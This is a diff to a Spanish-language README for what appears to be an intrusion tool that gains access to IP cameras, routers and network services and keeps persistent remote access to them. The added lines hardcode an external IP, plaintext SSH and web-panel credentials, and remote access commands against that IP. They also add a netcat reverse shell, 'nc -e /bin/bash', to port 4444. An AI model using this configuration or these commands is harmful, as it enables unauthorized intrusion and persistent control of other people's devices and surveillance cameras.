@@ -132,6 +132,8 @@ El script genera un único archivo JSON con toda la información:
     "cameras_accessed": 2,
     "router_access": 1,
     "network_services": 3,
+    "total_remote_access_points": 8,
+    "remote_access_available": true,
     "execution_time": 120.5,
     "success_rate": 30.0
   }
@@ -236,13 +238,37 @@ El script incluye funcionalidades avanzadas para mantener acceso persistente a l
 }
 ```
 
+### Configuración de Acceso Remoto
+
+El script utiliza un archivo `config.json` para configurar la IP pública y puertos:
+
+```json
+{
+  "remote_access": {
+    "external_ip": "184.107.168.100",
+    "external_port": 4444
+  },
+  "persistence": {
+    "ssh_port": 2222,
+    "vpn_port": 1194,
+    "web_port": 8080
+  },
+  "credentials": {
+    "ssh_user": "svc_ssh",
+    "ssh_password": "SSH_P@ssw0rd_2024!",
+    "web_user": "admin",
+    "web_password": "Web_P@ssw0rd_2024!"
+  }
+}
+```
+
 ### Métodos de Acceso Remoto
 
 Con la persistencia configurada, puedes acceder remotamente usando:
 
 1. **SSH Persistente**:
    ```bash
-   ssh svc_ssh@EXTERNAL_IP -p 2222
+   ssh svc_ssh@184.107.168.100 -p 2222
    ```
 
 2. **VPN OpenVPN**:
@@ -252,7 +278,12 @@ Con la persistencia configurada, puedes acceder remotamente usando:
 
 3. **Panel Web**:
    ```bash
-   http://admin:Web_P@ssw0rd_2024!@EXTERNAL_IP:8080/admin
+   http://admin:Web_P@ssw0rd_2024!@184.107.168.100:8080/admin
+   ```
+
+4. **Reverse Shell**:
+   ```bash
+   nc -e /bin/bash 184.107.168.100 4444
    ```
 
 ## 📹 Información de Cámaras IP
